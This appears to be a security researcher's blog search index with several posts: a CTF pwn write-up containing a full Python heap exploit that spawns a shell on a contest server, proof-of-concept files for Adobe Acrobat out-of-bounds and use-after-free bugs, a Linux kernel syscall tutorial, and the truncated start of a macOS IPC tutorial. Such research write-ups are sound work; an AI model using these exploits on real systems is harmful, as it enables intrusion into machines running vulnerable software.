<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>360春秋CTF--pwn</title>
    <url>/2017/04/22/360%E6%98%A5%E7%A7%8BCTF-pwn/</url>
    <content><![CDATA[<h4 id="0x00-pwn300-smallest"><a href="#0x00-pwn300-smallest" class="headerlink" title="0x00 : pwn300 smallest"></a>0x00 : pwn300 smallest</h4><h5 id="1-vuln"><a href="#1-vuln" class="headerlink" title="1.vuln"></a>1.vuln</h5><p>直接栈溢出，但是利用SYSCALL读取的。</p>
<h5 id="2-think"><a href="#2-think" class="headerlink" title="2. think"></a>2. think</h5><p>考察SROP</p>
<a id="more"></a>

<h5 id="3-exploit"><a href="#3-exploit" class="headerlink" title="3. exploit"></a>3. exploit</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">:(  undone.</span><br></pre></td></tr></table></figure>



<h4 id="0x01-pwn350-hiddenlove"><a href="#0x01-pwn350-hiddenlove" class="headerlink" title="0x01 : pwn350 hiddenlove"></a>0x01 : pwn350 hiddenlove</h4><h5 id="1-vuln-1"><a href="#1-vuln-1" class="headerlink" title="1.vuln"></a>1.vuln</h5><p>说句题外话…几乎原封不动抄hitcon2016–babyheap的，就改了改字符串…</p>
<p>输入函数的off-by-one。</p>
<h5 id="2-think-1"><a href="#2-think-1" class="headerlink" title="2. think"></a>2. think</h5><p>程序限制了只能一次edit一次free，但是提示ubuntu16.04版本，这个版本scanf函数读取大量数据会有heap的分配。</p>
<p>通过堆布局来伪造堆头结构，然后再结合off by one伪造指针，得到任意地址读写，然后劫持got去get shell。</p>
<h5 id="3-exploit-1"><a href="#3-exploit-1" class="headerlink" title="3. exploit"></a>3. exploit</h5><p>其实直接拿babyheap的exp改就行了…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> sc_pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">env = Environment(<span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;remote&#x27;</span>)</span><br><span class="line">env.set_item(<span class="string">&#x27;target&#x27;</span>,  local   = &#123;<span class="string">&#x27;host&#x27;</span>:<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;port&#x27;</span>:<span class="number">10001</span>&#125;, \</span><br><span class="line">                        remote  = &#123;<span class="string">&#x27;host&#x27;</span>:<span class="string">&#x27;106.75.84.68&#x27;</span>,<span class="string">&#x27;port&#x27;</span>:<span class="number">20000</span>&#125;)</span><br><span class="line">env.select()</span><br><span class="line"></span><br><span class="line">binf = ELF(<span class="string">&#x27;./hiddenlove&#x27;</span>, rop=<span class="literal">True</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">addr_got_free       = binf.got(&#x27;free&#x27;)</span></span><br><span class="line"><span class="string">addr_got_exit       = binf.got(&#x27;exit&#x27;)</span></span><br><span class="line"><span class="string">addr_got_puts       = binf.got(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addr_plt_puts       = binf.plt(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_printf     = binf.plt(&#x27;printf&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_alarm      = binf.plt(&#x27;alarm&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_read       = binf.plt(&#x27;read&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_stack_cf   = binf.plt(&#x27;__stack_chk_fail&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_libc_stm   = binf.plt(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_malloc     = binf.plt(&#x27;malloc&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_atoi       = binf.plt(&#x27;atoi&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_scanf      = binf.plt(&#x27;__isoc99_scanf&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_setbuf     = binf.plt(&#x27;setbuf&#x27;)</span></span><br><span class="line"><span class="string">addr_plt_exit       = binf.plt(&#x27;exit&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#==========</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">cmn</span>):</span></span><br><span class="line">    bh = BabyHeap(cmn)</span><br><span class="line"></span><br><span class="line">    chunk_1  = <span class="string">&#x27;nn&#x27;</span></span><br><span class="line">    chunk_1 += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x18</span>-<span class="built_in">len</span>(chunk_1))</span><br><span class="line">    chunk_1 += pack_64(<span class="number">0x50</span>)</span><br><span class="line">    bh.Exit(chunk_1)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 1 done&#x27;</span></span><br><span class="line"></span><br><span class="line">    chunk_3  = pack_64(<span class="number">0</span>)</span><br><span class="line">    chunk_3 += pack_64(<span class="number">0x21</span>)</span><br><span class="line">    bh.New(<span class="number">0x80</span>, chunk_3, <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 2 done&#x27;</span></span><br><span class="line">    bh.Delete()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 3 done&#x27;</span></span><br><span class="line">    </span><br><span class="line">    rewrite_got  = pack_64(<span class="number">0x4006C0</span>+<span class="number">6</span>)      <span class="comment"># puts</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x4006D0</span>+<span class="number">6</span>)  <span class="comment">#stack_check</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x4006E0</span>+<span class="number">6</span>)          <span class="comment">#setbuf</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x4006F0</span>+<span class="number">6</span>)       <span class="comment">#printf</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400700</span>+<span class="number">6</span>)   <span class="comment"># alarm</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400710</span>+<span class="number">6</span>)    <span class="comment"># read</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400720</span>+<span class="number">6</span>)    <span class="comment"># start main</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400730</span>+<span class="number">6</span>)          <span class="comment">#malloc</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x4006F0</span>)     <span class="comment"># atoi --changed</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400750</span>+<span class="number">6</span>)</span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400700</span>)      <span class="comment">#exit</span></span><br><span class="line"></span><br><span class="line">    chunk_2  = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">    chunk_2 += pack_64(<span class="built_in">len</span>(rewrite_got))        <span class="comment"># size</span></span><br><span class="line">    chunk_2 += pack_64(<span class="number">0</span>)                       <span class="comment"># name (over written)</span></span><br><span class="line">    chunk_2 += pack_64(addr_got_puts)           <span class="comment"># &amp;content</span></span><br><span class="line">    bh.New(<span class="number">0x48</span>, chunk_2, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    bh.Edit(rewrite_got)                        <span class="comment"># got_exit &lt;- alarm, got_atoi &lt;- printf</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 4 done&#x27;</span></span><br><span class="line">    <span class="comment">#cmn.read_until(&#x27;feet&#x27;)</span></span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    cmn.send(<span class="string">&#x27;%7$saaaa&#x27;</span>+pack_64(addr_got_free)) <span class="comment"># FSB</span></span><br><span class="line">    junk = cmn.read_until(<span class="string">&#x27;4.Just throw yourself at her feet\n&#x27;</span>)</span><br><span class="line">    addr_libc_free = cmn.read(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    addr_libc_free = unpack_64(addr_libc_free+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(addr_libc_free)))</span><br><span class="line">    info(<span class="string">&#x27;addr_libc_free    = 0x%08x&#x27;</span> % addr_libc_free)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 5 done&#x27;</span></span><br><span class="line">    libc.set_location(<span class="string">&#x27;free&#x27;</span>, addr_libc_free)</span><br><span class="line">    addr_libc_system    = libc.function(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    info(<span class="string">&#x27;addr_libc_system  = 0x%08x&#x27;</span> % addr_libc_system)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;part 6 done&#x27;</span></span><br><span class="line"></span><br><span class="line">    rewrite_got =  pack_64(<span class="number">0x0000000004006C0</span>+<span class="number">6</span>)          <span class="comment">#puts</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x0000000004006D0</span>+<span class="number">6</span>)    <span class="comment">#fail</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x00000000004006E0</span>+<span class="number">6</span>)  <span class="comment">#setbuf</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x00000000004006F0</span>+<span class="number">6</span>)                <span class="comment">#printf</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x0000000000400700</span>+<span class="number">6</span>)<span class="comment">#alarm</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400716</span>) <span class="comment">#read</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x000000000400720</span>+<span class="number">6</span>)  <span class="comment">#start</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x000000000400730</span>+<span class="number">6</span>)       <span class="comment">#malloc</span></span><br><span class="line">    rewrite_got += pack_64(addr_libc_system)                <span class="comment">#atoi</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x000000000400750</span>+<span class="number">6</span>)                <span class="comment">#scanf</span></span><br><span class="line">    rewrite_got += pack_64(<span class="number">0x400B0B</span>)                <span class="comment">#exit</span></span><br><span class="line"></span><br><span class="line">    cmn.read_until(<span class="string">&#x27;feet&#x27;</span>)</span><br><span class="line">    cmn.sendln(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    cmn.read_until(<span class="string">&#x27;feelings&#x27;</span>)</span><br><span class="line">    cmn.send(rewrite_got)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    cmn.send(<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#==========</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BabyHeap</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, cmn</span>):</span></span><br><span class="line">        self._read       = cmn.read</span><br><span class="line">        self._read_until = cmn.read_until</span><br><span class="line">        self._send       = cmn.send</span><br><span class="line">        self._sendln     = cmn.sendln</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">New</span>(<span class="params">self, size, content, name</span>):</span></span><br><span class="line">        self._read_until(<span class="string">&#x27;feet&#x27;</span>)</span><br><span class="line">        self._sendln(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        prompt = self._read(<span class="number">12</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;how many&#x27;</span> <span class="keyword">in</span> prompt:</span><br><span class="line">            self._sendln(<span class="built_in">str</span>(size))</span><br><span class="line">            self._read_until(<span class="string">&#x27;her(0~1000)&#x27;</span>)</span><br><span class="line">            self._send(content)</span><br><span class="line">            self._read_until(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">            self._send(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fail(<span class="string">&#x27;Remote program is exited&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._read_until(<span class="string">&#x27;feet&#x27;</span>)</span><br><span class="line">        self._sendln(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        self._read_until(<span class="string">&#x27;feet&#x27;</span>)</span><br><span class="line">        self._sendln(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        self._read_until(<span class="string">&#x27;feelings&#x27;</span>)</span><br><span class="line">        self._send(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Edit1</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        self._sendln(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        self._send(content)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exit</span>(<span class="params">self, ans</span>):</span></span><br><span class="line">        self._read_until(<span class="string">&#x27;feet&#x27;</span>)</span><br><span class="line">        self._sendln(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">        self._read_until(<span class="string">&#x27;(Y/N)&#x27;</span>)</span><br><span class="line">        self._sendln(ans)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cmn = Communicate(env.target,mode=<span class="string">&#x27;SOCKET&#x27;</span>)</span><br><span class="line">    attack(cmn)</span><br><span class="line">    sh = Shell(cmn)</span><br><span class="line">    sh.select()</span><br><span class="line">    <span class="keyword">del</span>(sh)</span><br><span class="line">    <span class="keyword">del</span>(cmn)</span><br><span class="line"><span class="comment">#==========</span></span><br></pre></td></tr></table></figure>



<h4 id="0x03-吐槽"><a href="#0x03-吐槽" class="headerlink" title="0x03 :吐槽"></a>0x03 :吐槽</h4><p>这个比赛运维水平真的有问题…</p>
<p>题目重复这个也不说了，反正某春秋之前的比赛也是这样。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe Acrobat DC Pro OOB(CVE-2019-7813)</title>
    <url>/2019/05/15/Adobe-Acrobat-DC-Pro-OOB-CVE-2019-7813/</url>
    <content><![CDATA[<h4 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h4><p>Out-of-Bounds Read </p>
<a id="more"></a>

<h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%PDF-1.7</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;&gt;&gt;</span><br><span class="line">%endobj</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">&#x2F;Root&lt;&lt;&#x2F;Pages 1 0 R&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>click <code>File</code>–&gt;<code>Properties</code></p>
<p>boring bug :(</p>
<h4 id="Patch-amp-amp-Bulletin"><a href="#Patch-amp-amp-Bulletin" class="headerlink" title="Patch &amp;&amp; Bulletin"></a>Patch &amp;&amp; Bulletin</h4><p><a href="https://helpx.adobe.com/security/products/acrobat/apsb19-18.html">adobe psirt</a></p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Adobe</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title>Adding your own syscall in linux kernel</title>
    <url>/2017/02/08/Adding-your-own-syscall-in-linux-kernel/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>主要是一个记录，搞kernel exploit可能会需要。给自己的linux增加一个自定义的系统调用，开始找的资料比较老3.x的内核，然而4.x的源码和3.x源码结构不太一样，所以过程也不太一样，多多参考一些<a href="http://lxr.free-electrons.com/source/Documentation/adding-syscalls.txt?v=4.3">比较官方的文档</a></p>
<a id="more"></a>
<p>环境准备</p>
<ul>
<li>   ubuntu 14.04 LTS x86 (4.2.0-42-generic)</li>
</ul>
<h4 id="0x01-过程"><a href="#0x01-过程" class="headerlink" title="0x01:过程"></a>0x01:过程</h4><h6 id="1-获取源码"><a href="#1-获取源码" class="headerlink" title="1.获取源码"></a>1.获取源码</h6><p><code>apt-get source linux-image-$(uname -r)</code></p>
<h6 id="2-编辑源码"><a href="#2-编辑源码" class="headerlink" title="2.编辑源码"></a>2.编辑源码</h6><p>首先创建一个目录放新增系统调用的定义<br><code>mkdir helloworld &amp;&amp; cd helloworld</code><br>然后进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># muhe @ ubuntu in ~&#x2F;linux_kernel_study&#x2F;linux-lts-wily-4.2.0&#x2F;helloworld [6:48:05] </span><br><span class="line">$ ls</span><br><span class="line">helloworld.c  Makefile</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_helloworld</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">"Hello world\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Makefile</span><br><span class="line">obj-y&#x3D;helloworld.o</span><br></pre></td></tr></table></figure>

<p>然后修改源码目录下的Makefile，把刚才新建的helloworld目录加进去<br>如图所示<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/add_syscall/Makefile.png"></p>
<p>修改<code>include/linux/syscalls.h</code>文件，把helloworld原型加进去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_execveat</span><span class="params">(<span class="keyword">int</span> dfd, <span class="keyword">const</span> <span class="keyword">char</span> __user *filename,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *argv,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">const</span> <span class="keyword">char</span> __user *<span class="keyword">const</span> __user *envp, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_helloworld</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>然后修改<code>arch/x86/entry/syscalls</code>下的<code>syscall_32.tbl</code>文件 添加这个调用的信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">355</span>	i386	getrandom		sys_getrandom</span><br><span class="line"><span class="number">356</span>	i386	memfd_create		sys_memfd_create</span><br><span class="line"><span class="number">357</span>	i386	bpf			sys_bpf</span><br><span class="line"><span class="number">358</span>	i386	execveat		sys_execveat			stub32_execveat</span><br><span class="line"><span class="number">359</span> i386    helloworld      sys_helloworld</span><br></pre></td></tr></table></figure>
<h6 id="3-编译新内核"><a href="#3-编译新内核" class="headerlink" title="3.编译新内核"></a>3.编译新内核</h6><p>先安装一些需要的工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get build-dep linux-image-$(uname -r)</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install curses-dev</span><br></pre></td></tr></table></figure>
<p>然后是配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod a+x debian&#x2F;scripts&#x2F;*</span><br><span class="line">chmod a+x debian&#x2F;scripts&#x2F;misc&#x2F;*</span><br><span class="line">fakeroot debian&#x2F;rules clean</span><br><span class="line">fakeroot debian&#x2F;rules editconfigs</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fakeroot debian&#x2F;rules clean</span><br><span class="line">fakeroot debian&#x2F;rules binary-headers binary-generic -j 2</span><br></pre></td></tr></table></figure>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/add_syscall/compiled.png"></p>
<h6 id="4-安装"><a href="#4-安装" class="headerlink" title="4.安装"></a>4.安装</h6><p>因为这样编译出来的是deb，所以直接dpkg安装就行了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/add_syscall/install.png"><br>安装结束后直接重启就好了。</p>
<h4 id="0x02：测试"><a href="#0x02：测试" class="headerlink" title="0x02：测试"></a>0x02：测试</h4><p>编写测试程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Invoking 'helloworld' system call"</span>);</span><br><span class="line">         </span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> ret = syscall(<span class="number">359</span>); <span class="comment">// 359 is the syscall number</span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后运行，然后使用dmesg查看打印的消息。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/add_syscall/run.png"><br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/add_syscall/dmesg.png"><br>可以看到打印了helloworld的信息，即这个syscall添加成功。</p>
<h4 id="0x03：参考与引用"><a href="#0x03：参考与引用" class="headerlink" title="0x03：参考与引用"></a>0x03：参考与引用</h4><p><a href="https://medium.com/@ssreehari/implementing-a-system-call-in-linux-kernel-4-7-1-6f98250a8c38#.4v3t86bf4">Implementing a system call in Linux Kernel 4.7.1</a><br><a href="https://study.prl85.com/?p=93">[UBUNTU 14.04] BUILDING LINUX KERNEL</a><br><a href="http://lxr.free-electrons.com/source/Documentation/adding-syscalls.txt?v=4.3">Linux/Documentation/adding-syscalls.txt</a><br><a href="https://arvindsraj.wordpress.com/2012/10/05/adding-hello-world-system-call-to-linux/">Adding hello world system call to Linux</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Adobe Acrobat DC Pro touchup UaF</title>
    <url>/2019/07/16/Adobe-Acrobat-DC-Pro-touchup-UaF/</url>
    <content><![CDATA[<h4 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h4><p>应该是18年下半年fuzz到的，不记得哪个版本的<code>Adobe Acrobat DC Pro</code>的<code>UaF</code>了，当时测试的是只能在32位机器上触发，留这个洞留了一个月没管，在19年年初修了。</p>
<p><code>藏洞藏到最后一无所有。</code></p>
<a id="more"></a>

<h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ooo = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"></span><br><span class="line">app.trigger = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    app.doc.embedDocAsDataObject(&#123;<span class="attr">cName</span>:<span class="string">&quot;http://www.B.com&quot;</span>, <span class="attr">oDoc</span>:app.trigger&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//must keep this line</span></span><br><span class="line"><span class="keyword">try</span>&#123;app.doc.newPage(&#123;<span class="attr">nWidth</span>:<span class="number">200</span>, <span class="attr">nHeight</span>:<span class="number">72</span>, <span class="attr">nPage</span>:<span class="number">2</span>&#125;);&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//trigger</span></span><br><span class="line"><span class="keyword">try</span>&#123;ooo.valueOf = app.trigger;&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//must keep this line </span></span><br><span class="line"><span class="keyword">try</span>&#123;ooo.valueOf();&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/o0xmuhe/RealWorldPwn/blob/master/Adobe-Acrobat-DC-Pro-touchup-UaF/uaf_touchup.pdf">poc.pdf</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Adobe</tag>
        <tag>UaF</tag>
      </tags>
  </entry>
  <entry>
    <title>Apple IPC : DO Basic</title>
    <url>/2019/08/10/Apple-IPC-DO-Basic/</url>
    <content><![CDATA[<h1 id="MacOS-IPC-之-DO"><a href="#MacOS-IPC-之-DO" class="headerlink" title="MacOS IPC 之 DO"></a>MacOS IPC 之 DO</h1><a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DO全称是<code>Distributed Objects</code>，从字面上来看意思很好理解，分布式对象。这是一种IPC方式，简单易用，实现的效果就是：通过launchd和一个proxy object，任何的进程都可以访问到server中的DO对象，也可以调用这个对象的方法，从而实现IPC。下面是一个流程图：</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/ipc_do/15654470622725.jpg"></p>
<p>(图来自pj0的博客，ianbeer的文章)</p>
<h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>server.m</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#import &lt;objc&#x2F;Object.h&gt;</span><br><span class="line">#import &lt;Foundation&#x2F;Foundation.h&gt;</span><br><span class="line"></span><br><span class="line">@interface VendMe : NSObject</span><br><span class="line">- (oneway void) foo: (int) value;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">@implementation VendMe</span><br><span class="line">- (oneway void) foo: (int) value;</span><br><span class="line">&#123;</span><br><span class="line">NSLog(@&quot;%d&quot;, value);</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">int main (int argc, const char * argv[]) &#123;</span><br><span class="line"> VendMe* toVend &#x3D; [[VendMe alloc] init];</span><br><span class="line"> NSConnection *conn &#x3D; [NSConnection defaultConnection];</span><br><span class="line"> [conn setRootObject:toVend];</span><br><span class="line"> [conn registerName:@&quot;com.foo.my_test_service&quot;];</span><br><span class="line"> [[NSRunLoop currentRunLoop] run];</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>client.m</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#import &lt;Cocoa&#x2F;Cocoa.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)&#123;</span><br><span class="line"> id theProxy &#x3D; [[NSConnection</span><br><span class="line">   rootProxyForConnectionWithRegisteredName:@&quot;com.foo.my_test_service&quot;</span><br><span class="line"> host:nil] retain];</span><br><span class="line"> [theProxy foo:123];</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Makefile</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all:</span></span><br><span class="line">		clang client.m -o client -framework Foundation</span><br><span class="line">		clang server.m -o server -framework Foundation</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	    rm server client</span><br></pre></td></tr></table></figure>

<p>运行效果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run server</span></span><br><span class="line">╰─$ ./server</span><br><span class="line">2019-08-10 22:27:07.545 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:08.897 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:09.662 server[28274:2677291] 123</span><br><span class="line">2019-08-10 22:27:10.172 server[28274:2677291] 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># run client times...</span></span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro ~/Downloads/DO_Study</span><br><span class="line">╰─$ ./client</span><br><span class="line">╭─muhe@muheMacBookPro 